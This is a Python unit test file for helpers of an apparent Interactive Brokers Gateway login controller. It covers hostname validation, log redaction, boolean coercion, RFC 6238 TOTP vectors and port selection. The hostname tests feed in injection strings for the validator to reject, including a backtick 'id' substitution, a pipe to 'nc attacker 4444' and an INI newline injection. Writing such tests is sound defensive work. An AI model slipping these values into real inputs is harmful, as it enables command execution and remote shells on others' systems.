"""Pure-Python unit tests for gateway_controller.py helpers.

No network, no filesystem side effects, no AT-SPI. Run with:

    python3 -m unittest discover -s tests -v

or via `make test` (which gates on unittest discover).

These tests import gateway_controller.py directly with the `gi` and
`gi.repository.Atspi` modules mocked in sys.modules so the real
pyatspi2 stack isn't required on the test host. That lets `make test`
pass in a minimal build container (eclipse-temurin:17-jdk + python3,
no GTK, no ATK).

What's covered:
  - _validate_hostname: accept DNS-label strings, reject whitespace /
    newlines / semicolons / control characters
  - _redact_logs: strip IBKR account number patterns (DU\\d+, U\\d+)
    from arbitrary strings; pass non-matching strings through
  - _coerce_yes_no: accept yes/no/true/false/1/0/on/off, return None
    for empty or unrecognized values (so the caller knows to skip)
  - generate_totp: regression test against RFC 6238 SHA1 test vectors
    using a monkey-patched time.time()
  - api_port_for_mode: returns 4001 for live, 4002 for paper

What's NOT covered by this file (tracked separately):
  - jts.ini writer (side effects on filesystem — needs tempdir fixture)
  - Agent protocol client (needs a mock socket server)
  - AT-SPI code paths (need the full gi stack)
  - Live login flow (needs real Gateway + real credentials)
"""

import os
import sys
import unittest
from unittest.mock import MagicMock, patch


def _load_module():
    """Load gateway_controller.py with the pyatspi2 stack stubbed out.

    Returns the module object, reusable across tests. Called once at
    import time and cached at module level so each TestCase doesn't
    pay the startup cost.
    """
    # Stub the gi / gi.repository / gi.repository.Atspi imports.
    sys.modules.setdefault("gi", MagicMock())
    sys.modules.setdefault("gi.repository", MagicMock())
    sys.modules.setdefault("gi.repository.Atspi", MagicMock())

    # The module does os.environ.get for several vars at load time;
    # most are optional but the controller checks USERNAME/PASSWORD
    # only inside main(), so we don't need to set them.
    os.environ.setdefault("TRADING_MODE", "paper")

    # Controller file is the sibling of tests/ in the repo layout.
    here = os.path.dirname(os.path.abspath(__file__))
    repo_root = os.path.dirname(here)
    module_path = os.path.join(repo_root, "gateway_controller.py")

    import importlib.util
    spec = importlib.util.spec_from_file_location("gateway_controller", module_path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules["gateway_controller"] = mod
    spec.loader.exec_module(mod)
    return mod


gc = _load_module()


class TestValidateHostname(unittest.TestCase):

    def test_accepts_simple_dns_label(self):
        self.assertEqual(
            gc._validate_hostname("cdc1.ibllc.com", "TWS_SERVER"),
            "cdc1.ibllc.com",
        )

    def test_accepts_another_real_example(self):
        self.assertEqual(
            gc._validate_hostname("ndc1.ibllc.com", "TWS_SERVER"),
            "ndc1.ibllc.com",
        )

    def test_accepts_hyphen_and_digit(self):
        self.assertEqual(
            gc._validate_hostname("host-1.example-co.com", "TWS_SERVER"),
            "host-1.example-co.com",
        )

    def test_accepts_empty_string(self):
        # Empty is allowed — it means "not set", fall back to Gateway's default
        self.assertEqual(
            gc._validate_hostname("", "TWS_SERVER"),
            "",
        )

    def test_rejects_newline(self):
        with self.assertRaisesRegex(ValueError, "not a valid hostname"):
            gc._validate_hostname("cdc1.ibllc.com\n[Logon]\nEvil=yes", "TWS_SERVER")

    def test_rejects_semicolon(self):
        with self.assertRaisesRegex(ValueError, "not a valid hostname"):
            gc._validate_hostname("cdc1.ibllc.com;evil", "TWS_SERVER")

    def test_rejects_space(self):
        with self.assertRaisesRegex(ValueError, "not a valid hostname"):
            gc._validate_hostname("cdc1.ibllc.com evil", "TWS_SERVER")

    def test_rejects_shell_metachar(self):
        with self.assertRaisesRegex(ValueError, "not a valid hostname"):
            gc._validate_hostname("cdc1.ibllc.com`id`", "TWS_SERVER")

    def test_rejects_pipe(self):
        with self.assertRaisesRegex(ValueError, "not a valid hostname"):
            gc._validate_hostname("cdc1.ibllc.com|nc attacker 4444", "TWS_SERVER")

    def test_error_message_names_the_variable(self):
        # Users need to know WHICH env var was bad
        try:
            gc._validate_hostname("bad space", "TWS_SERVER_PAPER")
        except ValueError as e:
            self.assertIn("TWS_SERVER_PAPER", str(e))
            self.assertIn("bad space", str(e))
        else:
            self.fail("should have raised ValueError")


class TestRedactLogs(unittest.TestCase):

    def test_redacts_paper_account_number(self):
        s = "DU9999999 Trader Workstation Configuration (Simulated Trading)"
        result = gc._redact_logs(s)
        self.assertIn("DU[REDACTED]", result)
        self.assertNotIn("DU9999999", result)
        self.assertIn("Trader Workstation Configuration", result)

    def test_redacts_live_account_number(self):
        self.assertEqual(
            gc._redact_logs("U1234567 Live Account"),
            "U[REDACTED] Live Account",
        )

    def test_passes_through_hostname(self):
        self.assertEqual(
            gc._redact_logs("cdc1.ibllc.com"),
            "cdc1.ibllc.com",
        )

    def test_passes_through_normal_log_line(self):
        self.assertEqual(
            gc._redact_logs("Login complete. Entering monitor loop."),
            "Login complete. Entering monitor loop.",
        )

    def test_passes_through_short_number(self):
        # Only DU/U followed by 5-10 digits should match. "DU123" is
        # too short and should pass through so we don't false-positive.
        self.assertEqual(gc._redact_logs("DU123"), "DU123")

    def test_handles_non_string(self):
        # The helper is defensive — non-strings pass through
        self.assertEqual(gc._redact_logs(None), None)
        self.assertEqual(gc._redact_logs(42), 42)
        self.assertEqual(gc._redact_logs([1, 2]), [1, 2])

    def test_redacts_multiple_in_one_string(self):
        s = "DU1111111 and DU2222222 and U3333333"
        result = gc._redact_logs(s)
        self.assertNotIn("DU1111111", result)
        self.assertNotIn("DU2222222", result)
        self.assertNotIn("U3333333", result)
        self.assertEqual(
            result,
            "DU[REDACTED] and DU[REDACTED] and U[REDACTED]",
        )


class TestCoerceYesNo(unittest.TestCase):

    def test_yes_values(self):
        for v in ["yes", "Yes", "YES", "true", "True", "TRUE",
                  "1", "on", "ON"]:
            self.assertEqual(gc._coerce_yes_no(v), True, f"failed on {v!r}")

    def test_no_values(self):
        for v in ["no", "No", "NO", "false", "False", "FALSE",
                  "0", "off", "OFF"]:
            self.assertEqual(gc._coerce_yes_no(v), False, f"failed on {v!r}")

    def test_empty_returns_none(self):
        self.assertIsNone(gc._coerce_yes_no(""))
        self.assertIsNone(gc._coerce_yes_no(None))

    def test_unrecognized_returns_none(self):
        self.assertIsNone(gc._coerce_yes_no("maybe"))
        self.assertIsNone(gc._coerce_yes_no("2"))
        self.assertIsNone(gc._coerce_yes_no("junk"))

    def test_whitespace_is_stripped(self):
        self.assertEqual(gc._coerce_yes_no("  yes  "), True)
        self.assertEqual(gc._coerce_yes_no("\tno\n"), False)


class TestGenerateTotp(unittest.TestCase):
    """Verify our TOTP against RFC 6238 appendix B SHA-1 test vectors.

    RFC 6238 uses the ASCII secret "12345678901234567890" (20 bytes)
    and several reference timestamps. Our implementation takes a
    base32 secret, so we convert the ASCII to base32 first.
    """

    SECRET = "12345678901234567890"
    # Base32-encoded version of the ASCII secret
    SECRET_B32 = "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ"

    def _at_time(self, unix_time):
        with patch.object(gc.time, "time", return_value=unix_time):
            return gc.generate_totp(self.SECRET_B32)

    def test_rfc6238_vector_59(self):
        # RFC 6238 appendix B: time=59, SHA-1 → 94287082 → last 6 digits "287082"
        self.assertEqual(self._at_time(59), "287082")

    def test_rfc6238_vector_1111111109(self):
        # RFC 6238: time=1111111109, SHA-1 → 07081804 → "081804"
        self.assertEqual(self._at_time(1111111109), "081804")

    def test_rfc6238_vector_1111111111(self):
        # RFC 6238: time=1111111111, SHA-1 → 14050471 → "050471"
        self.assertEqual(self._at_time(1111111111), "050471")

    def test_rfc6238_vector_1234567890(self):
        # RFC 6238: time=1234567890, SHA-1 → 89005924 → "005924"
        self.assertEqual(self._at_time(1234567890), "005924")

    def test_code_is_six_digits_zero_padded(self):
        # A synthetic case where the counter produces a value < 100000
        # should get zero-padded to 6 digits. We pick a time that
        # we happen to know produces such a value (the RFC vectors above
        # include "081804" which already starts with 0).
        self.assertEqual(len(self._at_time(1111111109)), 6)


class TestApiPortForMode(unittest.TestCase):
    """api_port_for_mode reads module-level TRADING_MODE. We set the
    module attribute directly for each test rather than re-importing."""

    def test_live_returns_4001(self):
        gc.TRADING_MODE = "live"
        self.assertEqual(gc.api_port_for_mode(), 4001)

    def test_paper_returns_4002(self):
        gc.TRADING_MODE = "paper"
        self.assertEqual(gc.api_port_for_mode(), 4002)


if __name__ == "__main__":
    unittest.main(verbosity=2)
